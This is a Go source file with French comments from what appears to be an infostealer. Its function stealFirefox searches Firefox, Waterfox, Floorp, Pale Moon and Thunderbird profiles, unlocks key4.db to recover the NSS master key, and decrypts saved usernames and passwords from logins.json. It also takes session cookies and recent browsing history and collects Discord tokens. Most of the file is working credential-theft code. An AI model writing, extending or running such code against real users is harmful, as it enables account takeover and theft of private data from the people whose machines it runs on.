// Extraction Mozilla : Firefox et ses dérivés (Waterfox, Floorp, Pale Moon,
// Thunderbird). Le chiffrement NSS n'a rien à voir avec Chromium :
//
//   - key4.db (SQLite) porte la clé maîtresse :
//     metaData.item1 = sel global,  metaData.item2 = marque « password-check »
//     nssPrivate.a11 = clé maîtresse chiffrée,  a102 = identifiant de clé
//   - logins.json porte les identifiants, chacun chiffré en ASN.1 (PBES2
//     récent, PBE-SHA1-3DES ancien) avec la clé maîtresse comme entrée.
//   - cookies.sqlite et places.sqlite sont, eux, en clair.
//
// Implémentation adossée aux références open-source : NSS softoken
// (searchfox), firepwd (lclevy) et BrowsersDataDumper (Go).
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/pbkdf2"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

/* ------------------------------------------------------------------ */
/* Profils                                                             */
/* ------------------------------------------------------------------ */

// firefoxRoots liste les dossiers parentes contenant un profiles.ini.
func firefoxRoots() []string {
	roaming := os.Getenv("APPDATA")
	return []string{
		filepath.Join(roaming, "Mozilla", "Firefox"),
		filepath.Join(roaming, "Waterfox"),
		filepath.Join(roaming, "Floorp"),
		filepath.Join(roaming, "Moonchild Productions", "Pale Moon"),
		filepath.Join(roaming, "Mozilla", "Thunderbird"),
		filepath.Join(roaming, "Thunderbird"),
	}
}

// ffProfile décrit un profil Mozilla repéré sur le disque.
type ffProfile struct {
	Root string
	Dir  string
	Tag  string
}

// firefoxProfiles lit profiles.ini (sections [ProfileN]) et retombe sur un
// simple balayage de <racine>/Profiles si le fichier est absent ou corrompu.
// Seuls les profils qui portent au moins une donnée retenue sont gardés.
func firefoxProfiles() []ffProfile {
	var out []ffProfile
	seen := map[string]bool{}

	keep := func(root, dir string) {
		if seen[dir] {
			return
		}
		if firstExisting(
			filepath.Join(dir, "logins.json"),
			filepath.Join(dir, "cookies.sqlite"),
			filepath.Join(dir, "places.sqlite"),
		) == "" {
			return
		}
		seen[dir] = true
		out = append(out, ffProfile{Root: root, Dir: dir, Tag: filepath.Base(dir)})
	}

	for _, root := range firefoxRoots() {
		if st, err := os.Stat(root); err != nil || !st.IsDir() {
			continue
		}

		// profiles.ini
		if raw, err := os.ReadFile(filepath.Join(root, "profiles.ini")); err == nil {
			inProfile := false
			rel := true
			path := ""
			flush := func() {
				if path == "" {
					return
				}
				dir := path
				if rel {
					dir = filepath.Join(root, filepath.FromSlash(path))
				}
				keep(root, dir)
				path = ""
			}
			for _, line := range strings.Split(string(raw), "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "[") {
					flush()
					inProfile = strings.HasPrefix(strings.ToLower(line), "[profile")
					rel = true
					continue
				}
				if !inProfile {
					continue
				}
				k, v, ok := strings.Cut(line, "=")
				if !ok {
					continue
				}
				k = strings.ToLower(strings.TrimSpace(k))
				v = strings.TrimSpace(v)
				switch k {
				case "path":
					path = v
				case "isrelative":
					rel = v == "1"
				}
			}
			flush()
		}

		// Repli : balayage de Profiles/ (et de la racine, pour Thunderbird).
		for _, base := range []string{filepath.Join(root, "Profiles"), root} {
			entries, err := os.ReadDir(base)
			if err != nil {
				continue
			}
			for _, e := range entries {
				if e.IsDir() {
					keep(root, filepath.Join(base, e.Name()))
				}
			}
		}
	}
	return out
}

/* ------------------------------------------------------------------ */
/* ASN.1 : les trois formes utilisées par NSS                          */
/* ------------------------------------------------------------------ */

// pbe3DES = PBE-SHA1-3DES (clé4.db ancien, usage NSS historique).
type pbe3DES struct {
	AlgoAttr struct {
		asn1.ObjectIdentifier
		SaltAttr struct {
			EntrySalt []byte
			KeyLen    int
		}
	}
	Encrypted []byte
}

// pbePBES2 = PBES2 + PBKDF2-HMAC-SHA256 + AES-CBC (key4.db moderne).
type pbePBES2 struct {
	AlgoAttr struct {
		asn1.ObjectIdentifier
		KDFParams struct {
			PBKDF2 struct {
				asn1.ObjectIdentifier
				SaltAttr struct {
					EntrySalt      []byte
					IterationCount int
					KeySize        int
					Algorithm      struct {
						asn1.ObjectIdentifier
					}
				}
			}
			IVData struct {
				asn1.ObjectIdentifier
				IV []byte
			}
		}
	}
	Encrypted []byte
}

// pbeLogin = forme des champs de logins.json.
type pbeLogin struct {
	KeyCheck []byte
	Algo     struct {
		asn1.ObjectIdentifier
		IV []byte
	}
	Encrypted []byte
}

// nssDecrypt tente les trois formes dans l'ordre. `salt` est le sel global
// pour les deux premières et la clé maîtresse pour la troisième.
func nssDecrypt(data, salt []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("donnée vide")
	}
	var p3 pbe3DES
	if _, err := asn1.Unmarshal(data, &p3); err == nil {
		return p3.decrypt(salt)
	}
	var pp pbePBES2
	if _, err := asn1.Unmarshal(data, &pp); err == nil {
		return pp.decrypt(salt)
	}
	var pl pbeLogin
	if _, err := asn1.Unmarshal(data, &pl); err == nil {
		return pl.decrypt(salt)
	}
	return nil, fmt.Errorf("structure ASN.1 NSS inconnue")
}

// deriveNSS PBE-SHA1-3DES. Référence : NSS lib/softoken/lowpbe.c.
func deriveNSSPBE(globalSalt, entrySalt []byte) (key, iv []byte) {
	hp := sha1.Sum(globalSalt)
	ck := sha1.Sum(append(hp[:], entrySalt...))
	padded := make([]byte, 20)
	copy(padded, entrySalt)

	h1 := hmac.New(sha1.New, ck[:])
	h1.Write(padded)
	mac1 := h1.Sum(nil)

	k1 := hmac.New(sha1.New, ck[:])
	k1.Write(append(append([]byte{}, padded...), entrySalt...))

	k2 := hmac.New(sha1.New, ck[:])
	k2.Write(append(append([]byte{}, mac1...), entrySalt...))

	dk := append(k1.Sum(nil), k2.Sum(nil)...) // 40 octets
	return dk[:24], dk[32:40]
}

func (p pbe3DES) decrypt(globalSalt []byte) ([]byte, error) {
	key, iv := deriveNSSPBE(globalSalt, p.AlgoAttr.SaltAttr.EntrySalt)
	return cbcDecrypt(des.NewTripleDESCipher, key, iv, p.Encrypted)
}

func (p pbePBES2) decrypt(globalSalt []byte) ([]byte, error) {
	hp := sha1.Sum(globalSalt)
	sa := p.AlgoAttr.KDFParams.PBKDF2.SaltAttr
	size := sa.KeySize
	if size <= 0 {
		size = 32
	}
	key, err := pbkdf2.Key(sha256.New, string(hp[:]), sa.EntrySalt, sa.IterationCount, size)
	if err != nil {
		return nil, fmt.Errorf("pbkdf2: %w", err)
	}
	raw := p.AlgoAttr.KDFParams.IVData.IV
	var iv []byte
	switch len(raw) {
	case aes.BlockSize: // déjà complet
		iv = raw
	case 14: // NSS stocke l'OctetString DER : tag 0x04 + longueur 0x0E
		iv = append([]byte{0x04, 0x0E}, raw...)
	default:
		iv = raw
	}
	return cbcDecrypt(aes.NewCipher, key, iv, p.Encrypted)
}

func (p pbeLogin) decrypt(masterKey []byte) ([]byte, error) {
	// La forme du IV dit la cipher : 8 octets = 3DES (avant Firefox 144),
	// 16 octets = AES-256 (Firefox 144 et suivants).
	switch len(p.Algo.IV) {
	case des.BlockSize:
		if len(masterKey) < des3KeyLen {
			return nil, fmt.Errorf("clé maîtresse trop courte pour 3DES")
		}
		return cbcDecrypt(des.NewTripleDESCipher, masterKey[:des3KeyLen], p.Algo.IV, p.Encrypted)
	case aes.BlockSize:
		if len(masterKey) < 32 {
			return nil, fmt.Errorf("clé maîtresse trop courte pour AES-256")
		}
		return cbcDecrypt(aes.NewCipher, masterKey[:32], p.Algo.IV, p.Encrypted)
	default:
		return nil, fmt.Errorf("IV de longueur %d", len(p.Algo.IV))
	}
}

const des3KeyLen = 24

// cbcDecrypt déchiffre en CBC et retire le remplissage PKCS#7.
func cbcDecrypt(newCipher func([]byte) (cipher.Block, error), key, iv, ct []byte) ([]byte, error) {
	block, err := newCipher(key)
	if err != nil {
		return nil, fmt.Errorf("clé: %w", err)
	}
	if len(iv) != block.BlockSize() {
		return nil, fmt.Errorf("IV %d octets (attendu %d)", len(iv), block.BlockSize())
	}
	if len(ct) == 0 || len(ct)%block.BlockSize() != 0 {
		return nil, fmt.Errorf("texte chiffré de longueur %d invalide", len(ct))
	}
	pt := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, ct)
	return pkcs7Unpad(pt)
}

func pkcs7Unpad(b []byte) ([]byte, error) {
	n := int(b[len(b)-1])
	if n == 0 || n > len(b) || n > aes.BlockSize {
		return nil, fmt.Errorf("remplissage PKCS#7 invalide")
	}
	for i := 0; i < n; i++ {
		if int(b[len(b)-1-i]) != n {
			return nil, fmt.Errorf("remplissage PKCS#7 corrompu")
		}
	}
	return b[:len(b)-n], nil
}

/* ------------------------------------------------------------------ */
/* Clé maîtresse                                                       */
/* ------------------------------------------------------------------ */

// nssKeyTypeTag = CKA_ID des vraies clés de nssPrivate (NSS softoken).
var nssKeyTypeTag = []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}

// firefoxKeys déverrouille key4.db d'un profil et rend les candidats clé
// maîtresse. La marque « password-check » est d'abord déchiffrée : si elle ne
// contient pas ce texte, le mot de passe maître du profil est renseigné et la
// clé n'est pas accessible.
func firefoxKeys(profile string, copyName string) ([][]byte, error) {
	src := filepath.Join(profile, "key4.db")
	if _, err := os.Stat(src); err != nil {
		return nil, fmt.Errorf("key4.db absent")
	}
	db, err := openDB(src, copyName)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	var globalSalt, check []byte
	if err := db.QueryRow(`SELECT item1, item2 FROM metaData WHERE id = 'password'`).
		Scan(&globalSalt, &check); err != nil {
		return nil, fmt.Errorf("metaData: %w", err)
	}

	plain, err := nssDecrypt(check, globalSalt)
	if err != nil {
		return nil, fmt.Errorf("password-check: %w", err)
	}
	if !strings.Contains(string(plain), "password-check") {
		return nil, fmt.Errorf("mot de passe maître Firefox renseigné")
	}

	type row struct{ enc, tag []byte }
	var rows []row
	if rs, err := db.Query(`SELECT a11, a102 FROM nssPrivate`); err == nil {
		for rs.Next() {
			var r row
			if rs.Scan(&r.enc, &r.tag) == nil && len(r.enc) > 0 {
				rows = append(rows, r)
			}
		}
		rs.Close()
	}
	if len(rows) == 0 {
		return nil, fmt.Errorf("nssPrivate vide")
	}

	// D'abord les clés au bon identifiant, puis le reste : un raccourci ne
	// coûte rien, une clé manquée oui.
	var keys [][]byte
	for _, pass := range [][]bool{{true, false}, {false, true}} {
		for _, r := range rows {
			tagged := string(r.tag) == string(nssKeyTypeTag)
			if tagged != pass[0] {
				continue
			}
			k, err := nssDecrypt(r.enc, globalSalt)
			if err != nil || len(k) < 24 {
				continue
			}
			keys = append(keys, k)
		}
		if len(keys) > 0 {
			break
		}
	}
	if len(keys) == 0 {
		return nil, fmt.Errorf("aucune clé déchiffrée")
	}
	return keys, nil
}

/* ------------------------------------------------------------------ */
/* logins.json                                                         */
/* ------------------------------------------------------------------ */

type ffLoginFile struct {
	Logins []struct {
		Hostname          string `json:"hostname"`
		Origin            string `json:"origin"`
		EncryptedUsername string `json:"encryptedUsername"`
		EncryptedPassword string `json:"encryptedPassword"`
		TimeLastUsed      int64  `json:"timeLastUsed"`
	} `json:"logins"`
}

// ffField déchiffre un champ de logins.json avec la première clé qui passe.
func ffField(keys [][]byte, encoded string) string {
	if encoded == "" {
		return ""
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		// Certains profils utilisent un base64 sans padding.
		raw, err = base64.RawStdEncoding.DecodeString(encoded)
		if err != nil {
			return ""
		}
	}
	for _, k := range keys {
		if out, err := nssDecrypt(raw, k); err == nil && len(out) > 0 {
			return string(out)
		}
	}
	return ""
}

/* ------------------------------------------------------------------ */
/* Collecte                                                            */
/* ------------------------------------------------------------------ */

// stealFirefox ajoute Firefox et ses dérivés : identifiants, cookies,
// historique. Renvoie les jetons de session trouvés dans les profils.
func stealFirefox(creds *[]credential, cookies *[]cookie, hist *[]histEntry) []string {
	var tokens []string
	profs := firefoxProfiles()
	if len(profs) == 0 {
		plog("steal Firefox | aucun profil trouvé")
		return nil
	}

	for i, p := range profs {
		var keys [][]byte
		var keyErr error
		if hasLogins(p.Dir) {
			keys, keyErr = firefoxKeys(p.Dir, fmt.Sprintf("ff_key4_%d", i))
		}

		nRow, nOK, nC, nCOK := 0, 0, 0, 0

		// ---- mots de passe ----
		if hasLogins(p.Dir) {
			raw, err := os.ReadFile(filepath.Join(p.Dir, "logins.json"))
			if err != nil {
				plog("Firefox/logins.json : " + err.Error())
			} else {
				var lf ffLoginFile
				if err := json.Unmarshal(raw, &lf); err != nil {
					plog("Firefox/logins.json illisible : " + err.Error())
				}
				for _, l := range lf.Logins {
					nRow++
					user := ffField(keys, l.EncryptedUsername)
					pass := ffField(keys, l.EncryptedPassword)
					host := l.Origin
					if host == "" {
						host = l.Hostname
					}
					if pass != "" {
						nOK++
					}
					if host != "" || user != "" || pass != "" {
						*creds = append(*creds, credential{"Firefox", p.Tag, host, user, pass})
					}
				}
			}
		}

		// ---- cookies (Firefox les garde en clair) ----
		if hasFile(p.Dir, "cookies.sqlite") {
			if db, err := openDB(filepath.Join(p.Dir, "cookies.sqlite"), "ff_cookies.db"); err != nil {
				plog("Firefox/cookies.sqlite : " + err.Error())
			} else {
				queryRows(db, "Firefox/cookies",
					`SELECT host, name, value FROM moz_cookies LIMIT 4000`,
					func(rows *sql.Rows) error {
						for rows.Next() {
							var host, name, val string
							if rows.Scan(&host, &name, &val) != nil {
								continue
							}
							nC++
							if val == "" {
								continue
							}
							// Par sécurité : si la valeur porte un en-tête
							// chiffré, on retente avec la clé du profil.
							if len(val) >= 3 && (val[:3] == "v10" || val[:3] == "v11") && len(keys) > 0 {
								s, ok := decryptValue(keys[0], []byte(val))
								if !ok || s == "" {
									continue
								}
								val = s
							}
							nCOK++
							*cookies = append(*cookies, cookie{"Firefox", host, name, val})
						}
						return nil
					})
				db.Close()
			}
		}

		// ---- historique ----
		if hasFile(p.Dir, "places.sqlite") {
			if db, err := openDB(filepath.Join(p.Dir, "places.sqlite"), "ff_places.db"); err != nil {
				plog("Firefox/places.sqlite : " + err.Error())
			} else {
				queryRows(db, "Firefox/places",
					`SELECT url, title, last_visit_date FROM moz_places
					 WHERE last_visit_date IS NOT NULL
					 ORDER BY last_visit_date DESC LIMIT 150`,
					func(rows *sql.Rows) error {
						for rows.Next() {
							var url, title string
							var ts int64
							if rows.Scan(&url, &title, &ts) != nil {
								continue
							}
							*hist = append(*hist, histEntry{URL: url, Title: title, When: ffTime(ts)})
						}
						return nil
					})
				db.Close()
			}
		}

		if keyErr != nil && hasLogins(p.Dir) {
			plog("steal Firefox/" + p.Tag + " | clé: " + keyErr.Error() +
				fmt.Sprintf(" | mots de passe %d/%d | cookies %d/%d", nOK, nRow, nCOK, nC))
		} else {
			plog(fmt.Sprintf("steal Firefox/%s | clé=%s | mots de passe %d/%d | cookies %d/%d",
				p.Tag, yesNo(len(keys) > 0), nOK, nRow, nCOK, nC))
		}

		tokens = append(tokens, discordTokens(p.Dir)...)
	}
	return tokens
}

// ffTime : places.sqlite compte des microsecondes depuis l'époque Unix.
func ffTime(us int64) string {
	if us <= 0 {
		return "-"
	}
	t := time.UnixMicro(us).Local()
	if t.Year() < 2000 || t.Year() > 2100 {
		return "-"
	}
	return t.Format("02/01 15:04")
}

func hasFile(dir, name string) bool {
	_, err := os.Stat(filepath.Join(dir, name))
	return err == nil
}

func hasLogins(dir string) bool {
	return hasFile(dir, "logins.json") && hasFile(dir, "key4.db")
}
